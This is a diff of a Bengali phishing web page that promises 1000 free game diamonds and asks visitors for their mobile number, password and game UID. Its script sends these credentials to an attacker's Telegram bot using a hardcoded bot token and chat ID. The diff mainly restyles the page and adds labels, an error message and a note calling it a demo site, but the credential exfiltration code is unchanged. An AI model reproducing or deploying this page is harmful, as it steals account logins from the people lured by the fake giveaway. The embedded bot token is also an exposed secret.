@@ -1,122 +1,174 @@
 <!DOCTYPE html>
 <html lang="bn">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ফ্রিতে ১০০০ ডায়মন্ড ক্লেম করুন</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
-            padding: 20px;
-        }
-        .header {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        .header h1 {
-            font-size: 26px;
-            font-weight: bold;
-            color: #000;
-            margin-bottom: 5px;
-        }
-        .header h2 {
-            font-size: 20px;
-            color: #333;
-            margin-top: 0;
-        }
-        .container {
-            background-color: #fff;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            max-width: 400px;
-            margin: 0 auto;
-        }
-        input[type="text"], input[type="password"] {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-        }
-        button {
-            padding: 10px 20px;
-            background-color: #28a745;
-            color: #fff;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        button:hover {
-            background-color: #218838;
-        }
-        .hidden {
-            display: none;
-        }
-    </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ফ্রিতে ১০০০ ডায়মন্ড ক্লেম করুন</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f4f4f9;
+            margin: 0;
+            padding: 0;
+        }
+        .header {
+            text-align: center;
+            background-color: #007bff;
+            color: #fff;
+            padding: 20px;
+            margin-bottom: 30px;
+        }
+        .header h1 {
+            font-size: 30px;
+            font-weight: bold;
+        }
+        .header h2 {
+            font-size: 20px;
+            margin-top: 10px;
+        }
+        .container {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+            background-color: #f9f9f9;
+            transition: border 0.3s ease;
+        }
+        input[type="text"]:focus, input[type="password"]:focus {
+            border: 1px solid #007bff;
+            background-color: #fff;
+        }
+        button {
+            width: 100%;
+            padding: 15px;
+            background-color: #28a745;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        button:hover {
+            background-color: #218838;
+        }
+        .hidden {
+            display: none;
+        }
+        .form-title {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 20px;
+        }
+        .note {
+            font-size: 14px;
+            color: #888;
+            text-align: center;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            font-size: 14px;
+            color: #555;
+        }
+        .error-message {
+            color: red;
+            font-size: 14px;
+            text-align: center;
+        }
+    </style>
 </head>
 <body>
 
-    <div class="header">
-        <h1>Lx Hridoy</h1>
-        <h2>ফ্রিতে ক্লেম করুন ১০০০ ডায়মন্ড</h2>
-    </div>
+    <div class="header">
+        <h1>Lx Hridoy</h1>
+        <h2>ফ্রিতে ক্লেম করুন ১০০০ ডায়মন্ড</h2>
+    </div>
 
-    <div class="container">
-        <h2>লগইন করুন</h2>
-        <form id="loginForm">
-            <input type="text" id="mobileNumber" placeholder="মোবাইল নাম্বার" required>
-            <input type="password" id="password" placeholder="পাসওয়ার্ড" required>
-            <button type="submit">লগইন</button>
-        </form>
+    <div class="container">
+        <h2 class="form-title">লগইন করুন</h2>
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="mobileNumber">মোবাইল নাম্বার</label>
+                <input type="text" id="mobileNumber" placeholder="মোবাইল নাম্বার" required>
+            </div>
+            <div class="form-group">
+                <label for="password">পাসওয়ার্ড</label>
+                <input type="password" id="password" placeholder="পাসওয়ার্ড" required>
+            </div>
+            <button type="submit">লগইন</button>
+        </form>
 
-        <div id="uidForm" class="hidden">
-            <h3>আপনার UID প্রদান করুন</h3>
-            <input type="text" id="uid" placeholder="UID" required>
-            <button id="submitBtn">সাবমিট</button>
-        </div>
-    </div>
+        <div id="uidForm" class="hidden">
+            <h3 class="form-title">আপনার UID প্রদান করুন</h3>
+            <div class="form-group">
+                <label for="uid">UID</label>
+                <input type="text" id="uid" placeholder="UID" required>
+            </div>
+            <button id="submitBtn">সাবমিট</button>
+        </div>
 
-    <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            document.getElementById('uidForm').classList.remove('hidden');
-        });
+        <div id="error-message" class="error-message hidden">অনুগ্রহ করে সব তথ্য প্রদান করুন</div>
 
-        document.getElementById('submitBtn').addEventListener('click', function () {
-            var mobileNumber = document.getElementById('mobileNumber').value;
-            var password = document.getElementById('password').value;
-            var uid = document.getElementById('uid').value;
+        <p class="note">এটি একটি ডেমো সাইট, বাস্তব সময়ের তথ্য প্রাপ্তির জন্য আরও নিরাপত্তা ব্যবস্থা প্রয়োজন।</p>
+    </div>
 
-            if (mobileNumber && password && uid) {
-                var token = '8141110802:AAE1S38ZRzKrTHNZDNhCISdXOMkQCoTzNSo';
-                var chatId = '6593402184';
-                var message = `নতুন তথ্য প্রাপ্ত হয়েছে:\nমোবাইল নাম্বার: ${mobileNumber}\nপাসওয়ার্ড: ${password}\nUID: ${uid}`;
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            // মোবাইল নাম্বার ও পাসওয়ার্ড চেক
+            if (document.getElementById('mobileNumber').value && document.getElementById('password').value) {
+                document.getElementById('uidForm').classList.remove('hidden');
+                document.getElementById('error-message').classList.add('hidden');
+            } else {
+                document.getElementById('error-message').classList.remove('hidden');
+            }
+        });
 
-                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message
-                    })
-                })
-                .then(response => response.json())
-                .then(data => {
-                    alert('UID সফলভাবে পাঠানো হয়েছে!');
-                })
-                .catch(error => {
-                    alert('UID পাঠাতে সমস্যা হয়েছে।');
-                    console.error(error);
-                });
-            } else {
-                alert('অনুগ্রহ করে সব তথ্য প্রদান করুন');
-            }
-        });
-    </script>
+        document.getElementById('submitBtn').addEventListener('click', function () {
+            var mobileNumber = document.getElementById('mobileNumber').value;
+            var password = document.getElementById('password').value;
+            var uid = document.getElementById('uid').value;
+
+            if (mobileNumber && password && uid) {
+                var token = '8141110802:AAE1S38ZRzKrTHNZDNhCISdXOMkQCoTzNSo';
+                var chatId = '6593402184';
+                var message = `নতুন তথ্য প্রাপ্ত হয়েছে:\nমোবাইল নাম্বার: ${mobileNumber}\nপাসওয়ার্ড: ${password}\nUID: ${uid}`;
+
+                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    alert('UID সফলভাবে পাঠানো হয়েছে!');
+                })
+                .catch(error => {
+                    alert('UID পাঠাতে সমস্যা হয়েছে।');
+                    console.error(error);
+                });
+            } else {
+                alert('অনুগ্রহ করে সব তথ্য প্রদান করুন');
+            }
+        });
+    </script>
 
 </body>
 </html>
